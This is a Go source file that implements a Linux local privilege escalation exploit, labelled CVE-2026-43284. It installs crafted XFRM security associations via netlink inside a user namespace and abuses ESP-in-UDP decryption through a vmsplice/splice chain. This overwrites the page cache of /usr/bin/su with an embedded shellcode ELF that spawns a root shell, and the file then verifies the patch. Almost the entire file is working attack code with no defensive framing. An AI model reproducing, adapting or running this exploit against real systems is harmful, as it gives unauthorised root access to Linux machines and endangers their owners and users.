package main

// ESP/XFRM LPE path - CVE-2026-43284
// Overwrites first 192 bytes of /usr/bin/su page-cache with a minimal
// x86_64 root-shell ELF by installing XFRM SAs with controlled seq_hi
// and triggering ESP in-place decryption via the vmsplice+splice chain.

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/exec"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

const (
	encPort     = 4500
	seqVal      = 200
	replaySeq   = 100
	targetPath  = "/usr/bin/su"
	patchOffset = 0
	payloadLen  = 192
	entryOffset = 0x78

	udpEncap         = 100 // UDP_ENCAP
	udpEncapESPInUDP = 2   // UDP_ENCAP_ESPINUDP
	solUDP           = 17  // SOL_UDP

	xfrmMsgNewSA      = 0x10 // XFRM_MSG_NEWSA (NLMSG_MIN_TYPE + 0)
	xfrmaAlgAuthTrunc = 20   // XFRMA_ALG_AUTH_TRUNC
	xfrmaAlgCrypt     = 2    // XFRMA_ALG_CRYPT
	xfrmaEncap        = 4    // XFRMA_ENCAP
	xfrmaReplayEsnVal = 23   // XFRMA_REPLAY_ESN_VAL
)

// 192-byte minimal x86_64 root-shell ELF.
var shellELF = [payloadLen]byte{
	0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a,
	0x0f, 0x05, 0xb0, 0x69, 0x0f, 0x05, 0xb0, 0x74, 0x0f, 0x05, 0x6a, 0x00, 0x48, 0x8d, 0x05, 0x12,
	0x00, 0x00, 0x00, 0x50, 0x48, 0x89, 0xe2, 0x48, 0x8d, 0x3d, 0x12, 0x00, 0x00, 0x00, 0x31, 0xf6,
	0x6a, 0x3b, 0x58, 0x0f, 0x05, 0x54, 0x45, 0x52, 0x4d, 0x3d, 0x78, 0x74, 0x65, 0x72, 0x6d, 0x00,
	0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
}

// lo127 is 127.0.0.1 in network byte order as uint32.
var lo127 = binary.BigEndian.Uint32(net.ParseIP("127.0.0.1").To4())

// bringUpLoopback brings up the loopback interface (called after namespace setup).
func bringUpLoopback() error {
	s, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, 0)
	if err != nil {
		return fmt.Errorf("socket(loopback): %w", err)
	}
	defer syscall.Close(s)

	var ifr [unix.IFNAMSIZ + 64]byte
	copy(ifr[:], "lo")
	if _, _, errno := syscall.Syscall(syscall.SYS_IOCTL, uintptr(s),
		unix.SIOCGIFFLAGS, uintptr(unsafe.Pointer(&ifr[0]))); errno != 0 {
		return fmt.Errorf("SIOCGIFFLAGS: %w", errno)
	}
	flags := binary.LittleEndian.Uint16(ifr[unix.IFNAMSIZ:])
	flags |= unix.IFF_UP | unix.IFF_RUNNING
	binary.LittleEndian.PutUint16(ifr[unix.IFNAMSIZ:], flags)
	if _, _, errno := syscall.Syscall(syscall.SYS_IOCTL, uintptr(s),
		unix.SIOCSIFFLAGS, uintptr(unsafe.Pointer(&ifr[0]))); errno != 0 {
		return fmt.Errorf("SIOCSIFFLAGS: %w", errno)
	}
	return nil
}

// ESPWorkerEnv is set in the child process spawned by suLPE.
const ESPWorkerEnv = "_DIRTYFRAG_ESP_WORKER"

// RunESPWorker is called when we detect we're the namespace-isolated child.
// At this point Go's exec has already cloned us into NEWUSER+NEWNET via
// SysProcAttr.Cloneflags, so unshare is not needed.
func RunESPWorker() {
	if err := bringUpLoopback(); err != nil {
		fmt.Fprintln(os.Stderr, "[!] loopback:", err)
		os.Exit(2)
	}
	time.Sleep(100 * time.Millisecond)

	for i := 0; i < payloadLen/4; i++ {
		spi := uint32(0xDEADBE10 + i)
		seqhi := uint32(shellELF[i*4+0])<<24 |
			uint32(shellELF[i*4+1])<<16 |
			uint32(shellELF[i*4+2])<<8 |
			uint32(shellELF[i*4+3])
		if err := addXfrmSA(spi, seqhi); err != nil {
			fmt.Fprintf(os.Stderr, "[!] addXfrmSA #%d: %v\n", i, err)
			os.Exit(2)
		}
	}
	fmt.Fprintf(os.Stderr, "[+] installed %d XFRM SAs\n", payloadLen/4)

	for i := 0; i < payloadLen/4; i++ {
		spi := uint32(0xDEADBE10 + i)
		off := int64(patchOffset + i*4)
		if err := doOneWrite(targetPath, off, spi); err != nil {
			fmt.Fprintf(os.Stderr, "[!] doOneWrite #%d at 0x%x: %v\n", i, off, err)
		}
	}
	fmt.Fprintf(os.Stderr, "[+] wrote %d bytes to %s\n", payloadLen, targetPath)
	os.Exit(0)
}

// nlAlign rounds up to 4-byte netlink alignment.
func nlAlign(n int) int { return (n + 3) &^ 3 }

// putAttr appends an rtattr to buf at position *pos and updates *pos.
func putAttr(buf []byte, pos *int, attrType int, data []byte) {
	attrLen := 4 + len(data) // rta_len + rta_type are each 2 bytes, total hdr = 4
	binary.LittleEndian.PutUint16(buf[*pos:], uint16(attrLen))
	binary.LittleEndian.PutUint16(buf[*pos+2:], uint16(attrType))
	copy(buf[*pos+4:], data)
	*pos += nlAlign(attrLen)
}

// addXfrmSA installs one XFRM Security Association via NETLINK_XFRM.
// patchSeqhi is stored in esn->seq_hi - the 4-byte word that will be
// written into the target file's page-cache during ESP decryption.
func addXfrmSA(spi, patchSeqhi uint32) error {
	sk, err := syscall.Socket(syscall.AF_NETLINK, syscall.SOCK_RAW, unix.NETLINK_XFRM)
	if err != nil {
		return fmt.Errorf("socket(NETLINK_XFRM): %w", err)
	}
	defer syscall.Close(sk)

	var nlsa syscall.RawSockaddrNetlink
	nlsa.Family = syscall.AF_NETLINK
	if err := syscall.Bind(sk, &syscall.SockaddrNetlink{Family: syscall.AF_NETLINK}); err != nil {
		return fmt.Errorf("bind(netlink): %w", err)
	}

	buf := make([]byte, 4096)

	// Build xfrm_usersa_info manually to match kernel struct layout.
	// We use the x/sys/unix types for size reference but serialize by hand.
	xs := buf[16:] // after the nlmsghdr (16 bytes)

	// xfrm_selector: daddr(16) + saddr(16) + ports(8) + family(2) + prefix(2) + proto(1) + ifindex(4) + user(4) = 53 + pad = 56
	// Zero most of it; set family, prefix, daddr, saddr.
	selBase := 0
	// daddr.a4 at offset 0
	binary.BigEndian.PutUint32(xs[selBase:], lo127)
	// saddr.a4 at offset 16
	binary.BigEndian.PutUint32(xs[selBase+16:], lo127)
	// family at offset 48 (after daddr16+saddr16+dport2+dport_mask2+sport2+sport_mask2 = 40)
	binary.LittleEndian.PutUint16(xs[selBase+40:], syscall.AF_INET)
	// prefixlen_d at offset 42
	xs[selBase+42] = 32
	// prefixlen_s at offset 43
	xs[selBase+43] = 32
	// xfrm_selector is 56 bytes total (with padding)
	selSz := 56

	// xfrm_id: daddr(16) + spi(4, BE) + proto(1) + pad(3) = 24
	idBase := selSz
	binary.BigEndian.PutUint32(xs[idBase:], lo127) // daddr.a4
	binary.BigEndian.PutUint32(xs[idBase+16:], spi) // spi already BE from caller? No - htonl(spi) in C.
	// Actually spi is passed as host value; C does htonl(spi). We store BE:
	binary.BigEndian.PutUint32(xs[idBase+16:], spi)
	xs[idBase+20] = syscall.IPPROTO_ESP // proto
	idSz := 24

	// saddr (xfrm_address_t = 16 bytes)
	saddrBase := idSz + selSz
	binary.BigEndian.PutUint32(xs[saddrBase:], lo127)
	saddrSz := 16

	// xfrm_lifetime_cfg: 4 * uint64 (soft/hard byte/packet limits)
	lftBase := saddrBase + saddrSz
	binary.LittleEndian.PutUint64(xs[lftBase:], ^uint64(0))    // soft_byte_limit
	binary.LittleEndian.PutUint64(xs[lftBase+8:], ^uint64(0))  // hard_byte_limit
	binary.LittleEndian.PutUint64(xs[lftBase+16:], ^uint64(0)) // soft_packet_limit
	binary.LittleEndian.PutUint64(xs[lftBase+24:], ^uint64(0)) // hard_packet_limit
	// offsets 32-63: soft/hard add/use expires - zero = no expiry
	lftSz := 64

	// xfrm_lifetime_cur: 4 * uint64 = 32
	curlftSz := 32

	// xfrm_stats: 3 * uint32 = 12
	statsSz := 12

	// seq(4) + reqid(4) + family(2) + mode(1) + replay_window(1) + flags(1) + pad(7) = 20
	tailBase := lftBase + lftSz + curlftSz + statsSz
	// reqid at offset 4
	binary.LittleEndian.PutUint32(xs[tailBase+4:], 0x1234)
	// family at offset 8
	binary.LittleEndian.PutUint16(xs[tailBase+8:], syscall.AF_INET)
	// mode at offset 10: XFRM_MODE_TRANSPORT = 0
	// flags at offset 12: XFRM_STATE_ESN = 128 = 0x80
	xs[tailBase+12] = 0x80 // XFRM_STATE_ESN

	xsSz := selSz + idSz + saddrSz + lftSz + curlftSz + statsSz + 20

	// netlink header
	pos := 16 + xsSz // current write position in buf
	nlmsgLen := pos

	// XFRMA_ALG_AUTH_TRUNC: xfrm_algo_auth + key
	// struct xfrm_algo_auth: name[64] + key_len(4) + trunc_len(4) + key[variable]
	authKey := make([]byte, 32)
	for i := range authKey {
		authKey[i] = 0xAA
	}
	authAttr := make([]byte, 64+4+4+len(authKey))
	copy(authAttr[0:], "hmac(sha256)")
	binary.LittleEndian.PutUint32(authAttr[64:], uint32(len(authKey)*8)) // alg_key_len bits
	binary.LittleEndian.PutUint32(authAttr[68:], 128)                    // alg_trunc_len bits
	copy(authAttr[72:], authKey)
	putAttr(buf, &pos, xfrmaAlgAuthTrunc, authAttr)

	// XFRMA_ALG_CRYPT: xfrm_algo + key
	// struct xfrm_algo: name[64] + key_len(4) + key[variable]
	encKey := make([]byte, 16)
	for i := range encKey {
		encKey[i] = 0xBB
	}
	encAttr := make([]byte, 64+4+len(encKey))
	copy(encAttr[0:], "cbc(aes)")
	binary.LittleEndian.PutUint32(encAttr[64:], uint32(len(encKey)*8))
	copy(encAttr[68:], encKey)
	putAttr(buf, &pos, xfrmaAlgCrypt, encAttr)

	// XFRMA_ENCAP: xfrm_encap_tmpl
	// struct xfrm_encap_tmpl: type(2) + sport(2,BE) + dport(2,BE) + pad(2) + oa(16) = 24
	encapAttr := make([]byte, 24)
	binary.LittleEndian.PutUint16(encapAttr[0:], udpEncapESPInUDP)
	binary.BigEndian.PutUint16(encapAttr[2:], encPort) // sport BE
	binary.BigEndian.PutUint16(encapAttr[4:], encPort) // dport BE
	putAttr(buf, &pos, xfrmaEncap, encapAttr)

	// XFRMA_REPLAY_ESN_VAL: xfrm_replay_state_esn + bmp[1 word]
	// struct: bmp_len(4) + oseq(4) + seq(4) + oseq_hi(4) + seq_hi(4) + replay_window(4) + bmp[bmp_len]
	esnAttr := make([]byte, 24+4) // 6 uint32 + 1 uint32 bmp
	binary.LittleEndian.PutUint32(esnAttr[0:], 1)            // bmp_len = 1
	binary.LittleEndian.PutUint32(esnAttr[8:], replaySeq)    // seq
	binary.LittleEndian.PutUint32(esnAttr[16:], patchSeqhi)  // seq_hi = payload word
	binary.LittleEndian.PutUint32(esnAttr[20:], 32)          // replay_window
	putAttr(buf, &pos, xfrmaReplayEsnVal, esnAttr)

	// Finalize netlink header
	nlmsgLen = pos
	binary.LittleEndian.PutUint32(buf[0:], uint32(nlmsgLen))                         // len
	binary.LittleEndian.PutUint16(buf[4:], xfrmMsgNewSA)                             // type
	binary.LittleEndian.PutUint16(buf[6:], syscall.NLM_F_REQUEST|syscall.NLM_F_ACK) // flags
	binary.LittleEndian.PutUint32(buf[8:], 1)                                        // seq
	binary.LittleEndian.PutUint32(buf[12:], uint32(os.Getpid()))                     // pid

	// Also fill nlmsg_len inside the struct (offset 16..19 in body = first field after nlmsghdr)
	// Actually xfrm_usersa_info doesn't start with nlmsg_len; the header precedes it.
	// The xs slice starts at buf[16], so buf[0:16] is nlmsghdr, buf[16:16+xsSz] is xfrm_usersa_info.
	// nlmsg_len in the header should cover header + body + attrs.
	_ = nlsa

	if _, err := syscall.Write(sk, buf[:nlmsgLen]); err != nil {
		return fmt.Errorf("send XFRM_MSG_NEWSA: %w", err)
	}

	rbuf := make([]byte, 4096)
	n, err := syscall.Read(sk, rbuf)
	if err != nil || n < 16 {
		return fmt.Errorf("recv XFRM ack: %w", err)
	}
	msgType := binary.LittleEndian.Uint16(rbuf[4:])
	if msgType == syscall.NLMSG_ERROR {
		errCode := int32(binary.LittleEndian.Uint32(rbuf[16:]))
		if errCode != 0 {
			return fmt.Errorf("XFRM_MSG_NEWSA error: %d", errCode)
		}
	}
	return nil
}

// doOneWrite triggers one XFRM ESP decryption into the target file's page-cache.
func doOneWrite(path string, offset int64, spi uint32) error {
	// Receive socket: UDP on port 4500, ESP-in-UDP encap.
	skRecv, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, 0)
	if err != nil {
		return err
	}
	defer syscall.Close(skRecv)

	one := int32(1)
	syscall.SetsockoptInt(skRecv, syscall.SOL_SOCKET, syscall.SO_REUSEADDR, 1)

	saD := syscall.SockaddrInet4{Port: encPort, Addr: [4]byte{127, 0, 0, 1}}
	if err := syscall.Bind(skRecv, &saD); err != nil {
		return fmt.Errorf("bind recv: %w", err)
	}
	if err := syscall.SetsockoptInt(skRecv, solUDP, udpEncap, udpEncapESPInUDP); err != nil {
		return fmt.Errorf("UDP_ENCAP: %w", err)
	}
	_ = one

	// Send socket: connected to 127.0.0.1:4500.
	skSend, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, 0)
	if err != nil {
		return err
	}
	defer syscall.Close(skSend)
	if err := syscall.Connect(skSend, &saD); err != nil {
		return fmt.Errorf("connect send: %w", err)
	}

	fileFd, err := syscall.Open(path, syscall.O_RDONLY, 0)
	if err != nil {
		return err
	}
	defer syscall.Close(fileFd)

	var pfd [2]int
	if err := syscall.Pipe(pfd[:]); err != nil {
		return err
	}
	defer syscall.Close(pfd[0])
	defer syscall.Close(pfd[1])

	// Build ESP header: SPI(4,BE) + SEQ(4,BE) + IV(16, dummy)
	var hdr [24]byte
	binary.BigEndian.PutUint32(hdr[0:], spi)
	binary.BigEndian.PutUint32(hdr[4:], seqVal)
	for i := 8; i < 24; i++ {
		hdr[i] = 0xCC
	}

	// vmsplice header into pipe write end.
	iov := unix.Iovec{Base: &hdr[0], Len: uint64(len(hdr))}
	if _, err := unix.Vmsplice(pfd[1], []unix.Iovec{iov}, 0); err != nil {
		return fmt.Errorf("vmsplice hdr: %w", err)
	}

	// splice 16 bytes of file at offset into pipe write end.
	off := offset
	if _, err := unix.Splice(fileFd, &off, pfd[1], nil, 16, unix.SPLICE_F_MOVE); err != nil {
		return fmt.Errorf("splice file→pipe: %w", err)
	}

	// splice pipe read end → UDP send socket (triggers XFRM decryption).
	unix.Splice(pfd[0], nil, skSend, nil, 24+16, unix.SPLICE_F_MOVE) //nolint:errcheck

	time.Sleep(150 * time.Millisecond)
	return nil
}

func verifyByte(path string, offset int64, want byte) bool {
	f, err := os.Open(path)
	if err != nil {
		return false
	}
	defer f.Close()
	b := make([]byte, 1)
	if _, err := f.ReadAt(b, offset); err != nil {
		return false
	}
	return b[0] == want
}

// suLPE spawns a namespace-isolated child via re-exec with Cloneflags.
// Go's runtime is multi-threaded so we can't call unshare(CLONE_NEWUSER)
// directly - instead we use exec.Cmd with SysProcAttr.Cloneflags which
// calls clone() on the child before the Go runtime starts.
func suLPE() bool {
	exe, err := os.Executable()
	if err != nil {
		exe = "/proc/self/exe"
	}

	cmd := exec.Command(exe)
	cmd.Env = append(os.Environ(), ESPWorkerEnv+"=1")
	cmd.Stdout = os.Stderr // child logs go to our stderr
	cmd.Stderr = os.Stderr
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Cloneflags: syscall.CLONE_NEWUSER | syscall.CLONE_NEWNET,
		UidMappings: []syscall.SysProcIDMap{
			{ContainerID: 0, HostID: os.Getuid(), Size: 1},
		},
		GidMappings: []syscall.SysProcIDMap{
			{ContainerID: 0, HostID: os.Getgid(), Size: 1},
		},
		GidMappingsEnableSetgroups: false,
	}

	if err := cmd.Run(); err != nil {
		fmt.Fprintf(os.Stderr, "[!] ESP child: %v\n", err)
		return false
	}

	if !verifyByte(targetPath, entryOffset, 0x31) || !verifyByte(targetPath, entryOffset+1, 0xff) {
		fmt.Fprintf(os.Stderr, "[!] ESP post-write verify failed\n")
		return false
	}
	fmt.Fprintf(os.Stderr, "[+] /usr/bin/su page-cache patched (entry 0x%x = shellcode)\n", entryOffset)
	return true
}
